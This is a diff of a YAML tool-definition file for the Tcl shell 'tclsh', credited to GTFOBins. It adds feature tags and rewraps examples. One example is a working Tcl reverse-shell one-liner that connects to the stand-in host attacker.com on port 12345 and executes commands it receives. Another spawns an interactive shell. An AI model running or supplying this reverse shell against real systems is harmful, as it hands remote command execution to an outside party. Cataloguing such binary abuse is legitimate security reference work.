@@ -2,7 +2,8 @@
 id: dev-tcl-tclsh
 namespace: dev:tcl:tclsh
 name: tclsh
-description: "Tcl scripting language shell; can execute code, read/write files, and spawn shells."
+description: Tcl scripting language shell; can execute code, read/write files, and
+  spawn shells.
 author: GTFOBins
 version: 1.0.0
 capabilities:
@@ -45,7 +46,13 @@ resource_profile:
 allowed-tools:
 - tclsh
 parameters: []
-features: []
+features:
+- file-system
+- interactive
+- local
+- pipes-stdin
+- process-manip
+- requires-root
 execution:
   template: tclsh
   sandbox: execFile
@@ -60,7 +67,9 @@ examples:
 - description: Send a reverse shell (sudo, suid, unprivileged)
   command: 'tclsh
 
-    set s [socket attacker.com 12345];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;'
+    set s [socket attacker.com 12345];while 1 { puts -nonewline $s "> ";flush $s;gets
+    $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush
+    $s; }; close $s;'
 - description: Spawn an interactive shell (sudo, suid, unprivileged)
   command: tclsh
 references:
@@ -76,7 +85,6 @@ install:
   commands:
   - apt-get install -y tcl
 ---
-
 
 # tclsh
 
